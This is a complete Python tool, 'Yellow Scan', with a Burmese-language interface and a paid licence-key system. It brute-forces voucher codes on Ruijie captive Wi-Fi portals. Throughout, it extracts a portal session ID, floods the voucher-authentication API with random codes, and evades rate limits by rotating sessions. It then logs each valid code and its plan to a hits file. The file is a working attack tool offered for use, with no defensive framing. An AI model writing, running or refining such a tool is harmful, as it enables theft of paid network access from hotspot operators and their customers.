#!/usr/bin/env python3
"""Yellow Scan v10.2 - Ruijie Bypass Engine (Perfect GYAN UI)"""
import os, sys, json, time, random, string, sqlite3, re, html, asyncio
import aiohttp, requests, urllib3, hashlib, uuid, platform
from datetime import datetime, timedelta
from urllib.parse import urlparse, parse_qs, urljoin
from rich.console import Console
from rich.panel import Panel
from rich.live import Live
from rich.table import Table
from rich.align import Align
from rich.text import Text
from rich.prompt import Prompt, Confirm
from rich.box import ROUNDED, SIMPLE, HEAVY
from rich.layout import Layout
from rich.padding import Padding

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

KEY_DB_FILE = "keys.db"
STATE_FILE = "scanner_state.json"
HITS_FILE = "hits.txt"
DEVICE_ID_FILE = ".sys_id.dat"
TIMEOUT = 5

USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36"
]

console = Console()
session = requests.Session()
session.headers.update({"User-Agent": random.choice(USER_AGENTS)})
stats = {'tested': 0, 'hits': [], 'status': 'Waiting...', 'current_code': '----'}
stop_event = None

# ==========================================
# 📱 PERMANENT DEVICE ID GENERATOR
# ==========================================
def get_device_id():
    if os.path.exists(DEVICE_ID_FILE):
        try:
            with open(DEVICE_ID_FILE, "r") as f:
                saved_id = f.read().strip()
                if saved_id:
                    return saved_id
        except Exception:
            pass
    raw = f"{platform.node()}-{uuid.getnode()}-{platform.machine()}-{platform.system()}"
    new_id = hashlib.sha256(raw.encode()).hexdigest()[:16].upper()
    try:
        with open(DEVICE_ID_FILE, "w") as f:
            f.write(new_id)
    except Exception:
        pass
    return new_id

# ==========================================
# 🔐 KEY DATABASE & TIME CHECK
# ==========================================
def init_key_db():
    conn = sqlite3.connect(KEY_DB_FILE, timeout=10, check_same_thread=False)
    conn.execute('''CREATE TABLE IF NOT EXISTS keys (
        key TEXT PRIMARY KEY, balance INTEGER DEFAULT 0,
        is_universal INTEGER DEFAULT 0, is_dev INTEGER DEFAULT 0,
        dev_limit INTEGER DEFAULT 0, duration TEXT DEFAULT 'Lifetime',
        device_id TEXT DEFAULT NULL, used_devices TEXT DEFAULT '[]',
        created_at TEXT, expires_at TEXT DEFAULT NULL, first_used_at TEXT DEFAULT NULL,
        removed INTEGER DEFAULT 0)''')
    conn.commit()
    return conn

def calculate_expiry(start_time_str, duration):
    if duration == "Lifetime": return "Lifetime"
    try:
        start = datetime.strptime(start_time_str, "%Y-%m-%d %H:%M:%S")
        num = int(duration[:-1]); unit = duration[-1]
        if unit == 'h': end = start + timedelta(hours=num)
        elif unit == 'd': end = start + timedelta(days=num)
        elif unit == 'w': end = start + timedelta(weeks=num)
        elif unit == 'm': end = start + timedelta(days=num*30)
        elif unit == 'y': end = start + timedelta(days=num*365)
        else: return "Lifetime"
        return end.strftime("%Y-%m-%d %H:%M:%S")
    except Exception:
        return "Lifetime"

def validate_key(conn, key, current_dev_id):
    if not key: return None
    try:
        row = conn.execute(
            "SELECT balance, is_universal, is_dev, dev_limit, duration, device_id, used_devices, created_at, expires_at, first_used_at, removed FROM keys WHERE key=?",
            (key.strip().upper(),)
        ).fetchone()
        if not row: return None
        
        balance, is_univ, is_dev, dev_limit, duration, db_dev_id, used_devices_json, created_at, expires_at, first_used_at, removed = row
        if removed: return {"error": "❌ ဒီ Key ကို Admin မှ ဖျက်ပစ်ထားပါတယ်။"}
        
        now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        if duration != "Lifetime":
            if not first_used_at:
                new_expiry = calculate_expiry(now_str, duration)
                conn.execute("UPDATE keys SET first_used_at=?, expires_at=? WHERE key=?", (now_str, new_expiry, key.strip().upper()))
                conn.commit()
                expires_at = new_expiry
            else:
                if expires_at != "Lifetime" and datetime.now() > datetime.strptime(expires_at, "%Y-%m-%d %H:%M:%S"):
                    return {"error": f"❌ ဒီ Key ရဲ့ သက်တမ်း ကုန်ဆုံးသွားပါပြီ။ ({expires_at})"}
        
        used_devs = json.loads(used_devices_json) if used_devices_json else []
        
        if is_dev:
            if db_dev_id != current_dev_id:
                return {"error": f"❌ ဒီ Key က အခြားဖုန်းအတွက် ထုတ်ထားတာပါ။"}
        elif is_univ:
            if dev_limit > 0:
                if current_dev_id not in used_devs:
                    if len(used_devs) >= dev_limit:
                        return {"error": f"❌ ဒီ Key ရဲ့ Device Limit ({dev_limit}) ပြည့်သွားပါပြီ။"}
                    else:
                        used_devs.append(current_dev_id)
                        conn.execute("UPDATE keys SET used_devices=? WHERE key=?", (json.dumps(used_devs), key.strip().upper()))
                        conn.commit()
                        
        return {
            "key": key.strip().upper(), "balance": balance,
            "is_universal": bool(is_univ), "is_dev": bool(is_dev),
            "dev_limit": dev_limit, "duration": duration, "device_id": db_dev_id,
            "expires_at": expires_at
        }
    except Exception: return None

def get_balance(conn, key):
    try:
        row = conn.execute("SELECT balance FROM keys WHERE key=?", (key,)).fetchone()
        return row[0] if row else 0
    except Exception: return 0

def deduct_balance(conn, key, amount=1):
    try:
        conn.execute("UPDATE keys SET balance = balance - ? WHERE key=?", (amount, key))
        conn.commit()
    except Exception: pass

# ==========================================
# 🎨 UI FUNCTIONS
# ==========================================
def clear_screen():
    try: os.system('cls' if os.name == 'nt' else 'clear')
    except Exception: pass

def format_time(seconds):
    try:
        s = int(seconds)
        return f"{s//3600:02d}:{(s%3600)//60:02d}:{s%60:02d}"
    except Exception: return "00:00:00"

def show_banner(dev_id=None):
    clear_screen()
    banner = """
[bold red]
 ██████╗ ██╗   ██╗ █████╗ ███╗   ██╗
██╔════╝ ╚██╗ ██╔╝██╔══██╗████╗  ██║
██║  ███╗ ╚████╔╝ ███████║██╔██╗ ██║
██║   ██║  ╚██╔╝  ██╔══██║██║╚██╗██║
╚██████╔╝   ██║   ██║  ██║██║ ╚████║
 ╚═════╝    ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝
[/bold red]
"""
    console.print(Align.center(Panel(Text.from_markup(banner), border_style="magenta", box=ROUNDED, expand=False)))
    
    if dev_id:
        console.print(Align.center(Text(f"\n📱 သင့်ဖုန်းရဲ့ Device ID: {dev_id}\n", style="bold green")))
        console.print(Align.center(Text("⚠️ ဒီ Device ID ကို Admin ဆီပို့ပြီး Key ထုတ်ပါ။\n", style="dim yellow")))

def show_key_info(kd, balance, dev_id):
    info = Text()
    info.append("\n  Key      : ", style="dim cyan")
    info.append(f"{kd['key'][:10]}...{kd['key'][-6:]}\n", style="bold white")
    
    info.append("  Device ID: ", style="dim cyan")
    info.append(f"{dev_id[:8]}...{dev_id[-4:]}\n", style="bold yellow")
    
    info.append("  Type     : ", style="dim cyan")
    if kd['is_dev']: info.append("DEV ID ACCESS\n", style="bold red")
    elif kd['is_universal']: info.append(f"UNIVERSAL (Limit: {kd['dev_limit']})\n", style="bold magenta")
    else: info.append("STANDARD\n", style="bold green")
        
    info.append("  Expiry   : ", style="dim cyan")
    info.append(f"{kd.get('expires_at', 'Lifetime')}\n", style="bold cyan")
    
    info.append("  Balance  : ", style="dim cyan")
    if kd['is_universal'] or kd['is_dev']: info.append("UNLIMITED\n", style="bold bright_green")
    elif balance > 0: info.append(f"{balance} scans left\n", style="bold bright_green")
    else: info.append("0 (Empty)\n", style="bold bright_red")
        
    console.print(Panel(info, border_style="cyan", box=ROUNDED, padding=(0, 1)))
# ==========================================
# 🔍 SCAN ENGINE HELPERS
# ==========================================
def normalize_hits(hits):
    if not hits: return []
    out = []
    for h in hits:
        if isinstance(h, dict):
            out.append({"code": h.get("code", ""), "plan": h.get("plan", "Active"), "time": h.get("time", "--:--:--")})
        else:
            out.append({"code": h, "plan": "Active", "time": "--:--:--"})
    return out

def hits_codes_only(hits):
    return [h.get("code") if isinstance(h, dict) else h for h in hits]

def init_scan_db():
    try:
        c = sqlite3.connect("scanner_data.db", timeout=10, check_same_thread=False)
        c.execute('CREATE TABLE IF NOT EXISTS tried_codes (code TEXT PRIMARY KEY)')
        c.commit()
        return c
    except Exception: return None

def is_tried(c, code):
    if c is None: return False
    try: return c.execute("SELECT 1 FROM tried_codes WHERE code=?", (code,)).fetchone() is not None
    except Exception: return False

def mark_tried(c, code):
    if c is None: return
    try:
        c.execute("INSERT OR IGNORE INTO tried_codes (code) VALUES (?)", (code,))
        c.commit()
    except Exception: pass

def load_state():
    try:
        with open(STATE_FILE) as f: return json.load(f)
    except Exception: return None

def save_state(mode, tested, hits, key):
    try:
        with open(STATE_FILE, "w") as f:
            json.dump({"mode": mode, "tested": tested, "hits": hits, "key": key}, f)
    except Exception: pass

def clear_state():
    try: os.remove(STATE_FILE)
    except Exception: pass

def extract_session(value):
    if not value: return None
    try: value = html.unescape(value)
    except Exception: pass
    try:
        q = parse_qs(urlparse(value).query)
        for k, v in q.items():
            if k.lower() == "sessionid" and v: return v[0]
    except Exception: pass
    try:
        m = re.search(r"sessionId=([a-zA-Z0-9_-]+)", value, re.IGNORECASE)
        return m.group(1) if m else None
    except Exception: return None

def fetch_session():
    probes = ["http://connectivitycheck.gstatic.com/generate_204", "http://captive.apple.com/hotspot-detect.html"]
    for url in probes:
        try:
            r = session.get(url, timeout=8, allow_redirects=True, verify=False)
        except Exception: continue
        try:
            p = urlparse(r.url)
            if "gstatic.com" in p.netloc or "apple.com" in p.netloc: continue
            base = f"{p.scheme}://{p.netloc}"
            cands = [r.url, r.text]
            cands.extend(h.headers.get("Location", "") for h in r.history)
            cands.extend(h.url for h in r.history)
            for c in cands:
                sid = extract_session(c)
                if sid: return base, sid
            try:
                m = re.search(r"(?:self|window)\.location\.href\s*=\s*['\"]([^'\"]+)['\"]", r.text)
                if m:
                    nxt = urljoin(r.url, m.group(1))
                    r2 = session.get(nxt, timeout=8, allow_redirects=True, verify=False)
                    sid = extract_session(r2.url) or extract_session(r2.text)
                    if sid: return base, sid
            except Exception: pass
        except Exception: continue
    return None, None

def _deep_search_hit(data, depth=0, ctx=None):
    if depth > 20 or not isinstance(data, dict): return None
    if ctx is None:
        ctx = {'logon_url': '', 'profile': '', 'total_min': 0, 'auth_result': None, 'success': None}
    URL_K = {'logonurl','loginurl','redirecturl','url','targeturl','location','href','logon','login','nexturl','authurl'}
    PROF_K = {'profilename','profile','username','user','name','plan','account','accountname'}
    MIN_K = {'totalminutes','minutes','balance','time','duration','remainingminutes','remainminutes'}
    AUTH_K = {'authresult','authres','resultcode','result'}
    SUC_K = {'success','ok','valid','auth'}
    for k, v in data.items():
        if not isinstance(k, str): continue
        kl = k.lower().replace(' ','').replace('_','').replace('-','')
        if kl in {x.replace('_','') for x in AUTH_K}:
            if ctx['auth_result'] is None: ctx['auth_result'] = v
            continue
        if kl in {x.replace('_','') for x in SUC_K}:
            if ctx['success'] is None and isinstance(v, (bool, int)): ctx['success'] = v
            continue
        if kl in {x.replace('_','') for x in URL_K}:
            if isinstance(v, str) and v.strip() and not ctx['logon_url']: ctx['logon_url'] = v.strip()
            continue
        if kl in {x.replace('_','') for x in PROF_K}:
            if isinstance(v, (str, int)) and v:
                s = str(v).strip()
                if s and not s.startswith(('http','/')) and not ctx['profile']: ctx['profile'] = s
            continue
        if kl in {x.replace('_','') for x in MIN_K}:
            try:
                iv = int(v or 0)
                if iv > ctx['total_min']: ctx['total_min'] = iv
            except (ValueError, TypeError): pass
    for v in data.values():
        if isinstance(v, dict): _deep_search_hit(v, depth+1, ctx)
        elif isinstance(v, list):
            for it in v:
                if isinstance(it, dict): _deep_search_hit(it, depth+1, ctx)
    if depth != 0: return None
    hit = False; reasons = []
    ar = ctx['auth_result']
    if ar is not None:
        ars = str(ar).strip().lower()
        if ars in ('1','true','yes','success','ok'): hit = True; reasons.append(f'authResult={ar}')
    if ctx['success'] is True or ctx['success'] == 1: hit = True; reasons.append('success=true')
    lu = ctx['logon_url']
    if lu and len(lu) > 20 and 'sessionid' in lu.lower():
        ars = str(ar).strip().lower() if ar is not None else ''
        if ars not in ('2','-1','false','expired','fail','error'): hit = True; reasons.append('logonUrl')
    if ctx['profile'] and ctx['total_min'] > 0: hit = True; reasons.append('profile+min')
    if not hit: return None
    return {'is_hit': True, 'logon_url': ctx['logon_url'], 'profile': ctx['profile'],
            'total_min': ctx['total_min'], 'auth_result': ctx['auth_result'],
            'success': ctx['success'], 'raw': data, 'reason': ' | '.join(reasons)}

def classify_response(data):
    if data is None: return ('error', None)
    if isinstance(data, str):
        t = data.lower()
        if not t.strip(): return ('error', None)
        if re.search(r'sessionId[=:"\']+([A-Za-z0-9_-]{6,})', data, re.I):
            return ('hit', {'is_hit': True, 'logon_url': data[:200], 'profile': '', 'total_min': 0,
                            'auth_result': None, 'raw': data, 'reason': 'html-sid'})
        if any(x in t for x in ('limit','exceed','too many','frequency')): return ('limit', None)
        if any(x in t for x in ('expired','out of date')): return ('expired', None)
        try:
            s = data.find('{'); e = data.rfind('}') + 1
            if s >= 0 and e > s: data = json.loads(data[s:e])
        except Exception: return ('wrong', None)
    if not isinstance(data, dict): return ('wrong', None)
    if not data: return ('error', None)
    hi = _deep_search_hit(data, 0, None)
    if hi and hi['is_hit']: return ('hit', hi)
    ar = None
    def find_ar(d):
        nonlocal ar
        if not isinstance(d, dict): return
        for k, v in d.items():
            if isinstance(k, str) and k.lower().replace('_','') in ('authresult','authres','resultcode'):
                if ar is None: ar = v; return
            if isinstance(v, dict): find_ar(v)
    find_ar(data)
    if ar is not None:
        s = str(ar).strip().lower()
        if s == '2': return ('expired', None)
        if s == '-1': return ('error', None)
        return ('wrong', None)
    succ = data.get('success')
    if succ is False or succ == 0: return ('wrong', None)
    if succ is True or succ == 1: return ('expired', None)
    msgs = ' '.join(str(data.get(k,'')).lower() for k in ('message','msg','error','info'))
    if any(x in msgs for x in ('limit','exceed','too many','frequency')): return ('limit', None)
    if any(x in msgs for x in ('expired','out of date')): return ('expired', None)
    return ('wrong', None)

def _bdicts(v):
    if isinstance(v, dict):
        yield v
        for c in v.values(): yield from _bdicts(c)
    elif isinstance(v, list):
        for c in v: yield from _bdicts(c)

def _fmt_plan(val):
    try: m = int(float(val))
    except (TypeError, ValueError): return "Unknown"
    if m <= 0: return "Expired"
    h, d = m // 60, m // 1440
    if d > 0: return f"{d} Day" if d == 1 else f"{d} Days"
    if h > 0: return f"{h} Hr" if h == 1 else f"{h} Hrs"
    return f"{m} Min"

async def fetch_voucher_plan(base, code, sid):
    urls = [f"{base}/api/auth/balance/getBalance/{code}", f"{base}/api/auth/balance/getBalance/{sid}"]
    headers = {"accept": "application/json, text/javascript, */*; q=0.01",
               "content-type": "application/json;", "user-agent": random.choice(USER_AGENTS),
               "x-requested-with": "XMLHttpRequest", "Origin": base,
               "Referer": f"{base}/download/static/maccauth/src/balance.html?sessionId={sid}"}
    for u in urls:
        try:
            async with aiohttp.ClientSession() as s:
                async with s.get(u, headers=headers, params={"sessionId": sid, "accessCode": code}, timeout=3, ssl=False) as r:
                    if r.status == 200:
                        data = await r.json()
                        for res in _bdicts(data):
                            pn = (res.get("profileName") or res.get("planName") or
                                  res.get("packageName") or res.get("productName") or res.get("profile"))
                            if pn and pn != "Unknown": return str(pn)
                            for k in ("remainingMinutes","remainMinutes","leftMinutes",
                                      "remainingTimeMinutes","durationMinutes","totalMinutes","totalTime"):
                                if res.get(k) is not None:
                                    ts = _fmt_plan(res[k])
                                    if ts: return ts
        except Exception: pass
    return "Verified"

async def async_test_code(base, sid, code):
    url = f"{base}/api/auth/voucher/?lang=en_US"
    headers = {"Content-Type": "application/json", "Origin": base, "User-Agent": random.choice(USER_AGENTS)}
    payload = {"accessCode": code, "sessionId": sid, "apiVersion": 1, "authCode": "ABCD"}
    try:
        async with aiohttp.ClientSession() as s:
            async with s.post(url, json=payload, headers=headers, ssl=False, timeout=TIMEOUT) as r:
                try: data = await r.json()
                except Exception: data = await r.text()
                return r.status, data
    except Exception: return 0, None

def gen_code(mode, length):
    if mode == "num": return str(random.randint(0, 10**length - 1)).zfill(length)
    if mode == "eng": return ''.join(random.choices(string.ascii_lowercase, k=length))
    if mode == "mix": return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    return ""

async def scan_worker(mode, length, base, sid, conn, key, key_conn, kd):
    code = gen_code(mode, length)
    if not code or is_tried(conn, code): return None
    mark_tried(conn, code)
    stats['current_code'] = code; stats['tested'] += 1; stats['status'] = "Active"
    sc, data = await async_test_code(base, sid, code)
    if sc == 0: return "NET_ERROR"
    cls, _ = classify_response(data)
    if cls == 'hit':
        if code not in hits_codes_only(stats['hits']):
            now = time.strftime("%H:%M:%S")
            plan = await fetch_voucher_plan(base, code, sid)
            stats['hits'].append({"code": code, "plan": plan, "time": now})
            try:
                with open(HITS_FILE, "a", encoding="utf-8") as f:
                    f.write(f"[{now}] CODE: {code} | PLAN: {plan}\n")
            except Exception: pass
        return "HIT"
    if cls == 'limit': return "LIMIT"
    if cls == 'expired': return "SESSION_DEAD"
    return "WRONG"
# ==========================================
# 🎨 GYAN UI LAYOUT (သပ်ရပ်သော ဘောင်ကွက်များ)
# ==========================================
def make_layout(mn, cur, tested, elapsed, status, hits, logs, bal, kd, dev_id):
    l = Layout()
    # ဘောင်တွေ ကပ်မနေအောင် နေရာလွတ် (padding) လေးတွေ ခံထားတယ်
    l.split_column(
        Layout(name="header", size=3),
        Layout(name="stats", size=5),
        Layout(name="logs", size=4),
        Layout(name="hits", ratio=1)
    )

    # Header (GYAN)
    header_panel = Panel(
        Align.center(Text("GYAN", style="bold red", justify="center")),
        border_style="magenta", box=HEAVY
    )
    l["header"].update(Padding(header_panel, (0, 1)))

    # Stats Row (4 columns)
    stats_tb = Table.grid(expand=True, padding=(0, 1))
    stats_tb.add_column(justify="center", ratio=1)
    stats_tb.add_column(justify="center", ratio=1)
    stats_tb.add_column(justify="center", ratio=1)
    stats_tb.add_column(justify="center", ratio=1)
    
    st_color = "bold green" if status == "Active" else "bold yellow"
    speed_val = tested // max(int(elapsed.split(':')[2] or 1), 1)
    
    stats_tb.add_row(
        Panel(Text(f"🔍 Code\n{cur}", justify="center"), border_style="green", box=ROUNDED),
        Panel(Text(f"🚀 Speed\n{speed_val}/s", justify="center"), border_style="cyan", box=ROUNDED),
        Panel(Text(f"⏱ Time\n{elapsed}", justify="center"), border_style="cyan", box=ROUNDED),
        Panel(Text(f"📊 Tested\n{tested}", justify="center"), border_style="yellow", box=ROUNDED),
        Panel(Text(f"⚡ Status\n{status.upper()}", style=st_color, justify="center"), border_style="magenta", box=ROUNDED)
    )
    l["stats"].update(Padding(stats_tb, (0, 1)))

    # Logs Box (နောက်ဆုံးတစ်ကြောင်းပဲ ပြမယ်)
    log_panel = Table.grid(expand=True)
    log_panel.add_column()
    
    if logs:
        msg = logs[-1] # နောက်ဆုံးစာကြောင်းကိုပဲ ယူမယ်
        txt = Text()
        txt.append(f"{time.strftime('%H:%M:%S')} ", style="cyan")
        txt.append(str(msg)) # အရောင်စံနစ်တွေ မပါတော့အောင် ဖျက်ထားတယ်
        log_panel.add_row(txt)
    else:
        log_panel.add_row(Text(f"{time.strftime('%H:%M:%S')} Initialized...", style="white"))

    log_body = Panel(log_panel, title="💻 GYAN Terminal Logs", border_style="cyan", box=ROUNDED, padding=(0, 1))
    l["logs"].update(Padding(log_body, (0, 1)))

    # Hits Box
    hits_tb = Table(show_header=True, header_style="bold cyan", expand=True, box=SIMPLE)
    hits_tb.add_column("No.", justify="center", width=4)
    hits_tb.add_column("Valid Code", justify="center")
    hits_tb.add_column("Plan / Balance", justify="center")
    hits_tb.add_column("Time", justify="center", width=10)
    
    for i, h in enumerate(hits[-10:], 1):
        if isinstance(h, dict): c, p, t = h.get("code",""), h.get("plan","Active"), h.get("time","--:--:--")
        else: c, p, t = h, "Active", "--:--:--"
        hits_tb.add_row(str(i), f"[bold green]{c}[/]", f"[yellow]{p}[/]", f"[dim cyan]{t}[/]")
        
    if not hits:
        hits_tb.add_row("", "[dim]No valid hits recorded yet...[/dim]", "", "")
        
    title = f"🎯 Hits Vault ({len(hits)}) | Time: {elapsed}"
    hits_body = Panel(hits_tb, title=title, border_style="green", box=ROUNDED, padding=(0, 1))
    l["hits"].update(Padding(hits_body, (0, 1)))
    
    return l

# ==========================================
# 🚀 SCAN LOOP
# ==========================================
async def async_scan_loop(mode, length, start_tested=0, start_hits=None, key_data=None, key_conn=None, dev_id=""):
    global stop_event
    stop_event = asyncio.Event()
    mn = f"{mode.upper()} {length}"
    stats['tested'] = start_tested
    stats['hits'] = normalize_hits(start_hits) if start_hits else []
    conn = init_scan_db()
    logs = []; start_t = time.time(); su = 0; nes = 0
    sid = None; base = None; last = ""
    ck = key_data["key"]; cb = key_data["balance"]

    def push(msg):
        nonlocal last
        # tag တွေ မပါအောင် ရှင်းမယ်
        clean_msg = re.sub(r'\[.*?\]', '', msg)
        if clean_msg != last:
            logs.append(clean_msg)
            last = clean_msg

    live = Live(make_layout(mn, "----", stats['tested'], "00:00:00", "Waiting",
                            stats['hits'], logs, cb, key_data, dev_id), refresh_per_second=4, screen=True)
    live.start()
    try:
        while not stop_event.is_set():
            cb = get_balance(key_conn, ck)
            if cb <= 0 and not key_data["is_universal"] and not key_data["is_dev"]:
                push("❌ Balance ကုန်ပါပြီ")
                live.update(make_layout(mn, "----", stats['tested'],
                                        format_time(time.time()-start_t), "Stopped",
                                        stats['hits'], logs, 0, key_data, dev_id))
                break
            if not sid:
                push("🔍 Fetching Session...")
                base, sid = await asyncio.to_thread(fetch_session)
                if not sid:
                    push("❌ Session မရပါ")
                    await asyncio.sleep(5)
                    continue
                su = 0; nes = 0
                push("✅ Session Found! Starting scan...")
                
            tasks = [scan_worker(mode, length, base, sid, conn, ck, key_conn, key_data) for _ in range(5)]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for r in results:
                if r == "NET_ERROR":
                    nes += 1
                    if nes >= 5:
                        sid = None
                        push("❌ Net Err")
                        break
                elif r == "LIMIT":
                    push("🚫 Rate Limit")
                    await asyncio.sleep(15)
                    sid = None
                    break
                elif r == "SESSION_DEAD":
                    sid = None
                    push("⏰ Session ကုန်")
                    break
                elif r == "HIT":
                    push(f"🎉 FOUND: {stats['current_code']}")
                    if not key_data["is_universal"] and not key_data["is_dev"]:
                        deduct_balance(key_conn, ck, 1)
                        
            if sid:
                su += 1
                if su >= 18:
                    sid = None
                    push("🔄 Session လဲ")
                    
            cb = get_balance(key_conn, ck)
            live.update(make_layout(mn, stats['current_code'], stats['tested'],
                                    format_time(time.time()-start_t), stats['status'],
                                    stats['hits'], logs, cb, key_data, dev_id))
            await asyncio.sleep(0.3)
    except KeyboardInterrupt: pass
    finally:
        live.stop()
        save_state(mn, stats['tested'], stats['hits'], ck)

# ==========================================
# 🎯 MENU & MAIN
# ==========================================
def ask_mode():
    while True:
        show_banner()
        m = Text("\n  [1] NUMERIC\n  [2] ENGLISH\n  [3] MIXED\n  [0] EXIT\n", style="white")
        console.print(Panel(m, title="[bold]Mode[/]", border_style="cyan", box=ROUNDED))
        try: c = Prompt.ask("[bold cyan]➜[/bold cyan]").strip()
        except KeyboardInterrupt: raise
        if c == "0": return None
        if c in ("1","2","3"): return {"1":"num","2":"eng","3":"mix"}[c]

def ask_length(mode):
    while True:
        clear_screen()
        m = Text("\n  [6] 6 chars\n  [7] 7 chars\n  [8] 8 chars\n  [9] 9 chars\n  [0] BACK\n", style="white")
        console.print(Panel(m, title="[bold]Length[/]", border_style="cyan", box=ROUNDED))
        try: c = Prompt.ask("[bold cyan]➜[/bold cyan]").strip()
        except KeyboardInterrupt: raise
        if c == "0": return None
        if c in ("6","7","8","9"): return int(c)

def run():
    key_conn = init_key_db()
    dev_id = get_device_id()
    show_banner(dev_id)
    
    console.print()
    console.print(Panel("[bold yellow]KEY ထည့်ပါ[/bold yellow]", border_style="yellow", box=ROUNDED))
    
    try: uk = Prompt.ask("[bold cyan]➜ Key[/bold cyan]").strip()
    except KeyboardInterrupt: return
    if not uk:
        console.print("[red]❌ Key မထည့်ပါ[/red]"); time.sleep(2); return

    kd = validate_key(key_conn, uk, dev_id)
    
    if not kd:
        console.print("[bold red]❌ Key မမှန်ပါ / ဖျက်ထားပါတယ်[/bold red]")
        time.sleep(2); return
        
    if "error" in kd:
        console.print(f"[bold red]{kd['error']}[/bold red]")
        time.sleep(3); return
        
    bal = get_balance(key_conn, kd["key"])
    show_key_info(kd, bal, dev_id)
    
    if bal <= 0 and not kd["is_universal"] and not kd["is_dev"]:
        console.print("[bold red]❌ Balance ကုန်နေပါတယ်[/bold red]")
        time.sleep(2); return
    console.print()
    if not Confirm.ask("[bold yellow]➜ ဆက်ရှာမလား?[/bold yellow]", default=True): return

    state = load_state()
    if state and state.get("key") == kd["key"]:
        try:
            m, l = state["mode"].split("_")
            tested = state.get("tested", 0)
            hits = normalize_hits(state.get("hits", []))
            clear_screen()
            console.print(Panel(Align.center(Text("💾 ရှာလက်စ တွေ့ပါတယ်", style="bold yellow")),
                                border_style="yellow", box=ROUNDED))
            info = Text()
            info.append(f"  Mode: {m.upper()} {l}  │  Tested: {tested:,}  │  Hits: {len(hits)}\n", style="white")
            console.print(Panel(info, border_style="green", box=ROUNDED))
            if Confirm.ask("[bold yellow]➜ ဆက်ရှာမလား?[/bold yellow]", default=True):
                asyncio.run(async_scan_loop(m, int(l), tested, hits, kd, key_conn, dev_id))
                return
            else:
                clear_state()
        except Exception: clear_state()

    mode = ask_mode()
    if mode is None: return
    length = ask_length(mode)
    if length is None: return
    clear_state()
    asyncio.run(async_scan_loop(mode, length, 0, [], kd, key_conn, dev_id))

if __name__ == "__main__":
    try: run()
    except KeyboardInterrupt:
        console.print("\n[bold yellow]🚪 Interrupted[/]"); sys.exit(0)
    except Exception as e:
        console.print(f"[bold red]❌ Fatal: {e}[/]")
        import traceback; traceback.print_exc()